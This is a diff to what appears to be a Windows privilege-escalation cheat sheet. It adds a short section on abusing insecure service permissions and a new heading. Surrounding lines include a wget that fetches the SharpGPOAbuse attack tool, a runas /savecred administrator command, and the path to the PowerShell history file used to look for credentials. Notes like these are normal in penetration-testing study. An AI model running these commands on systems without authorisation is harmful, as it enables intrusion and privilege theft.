@@ -56,9 +56,9 @@ https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.p
 ```
 wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
 ```
-____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+___________________________________________________________________________________________________________________________________________________________________________________________________________________________
 
-# Window Privesc
+# Window Privesc Normal
 ## PowerUp
 - Check Default Username and Password from Registry
 ```
@@ -116,7 +116,15 @@ runas.exe /savecred /user:administrator cmd
 C:\Users\student\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_History.txt
 ```
 
-## 
+## Insecure Service Permissions 
+- Check the vulnerable service with PowerUp, AccessChk or metasploit
+- Check permissions by ACL or by all means
+- Modify the service configuration
+- Restart the service
+```
 
+```
 
+___________________________________________________________________________________________________________________________________________________________________________________________________________________________
 
+# Advanced PrivESC Techniques
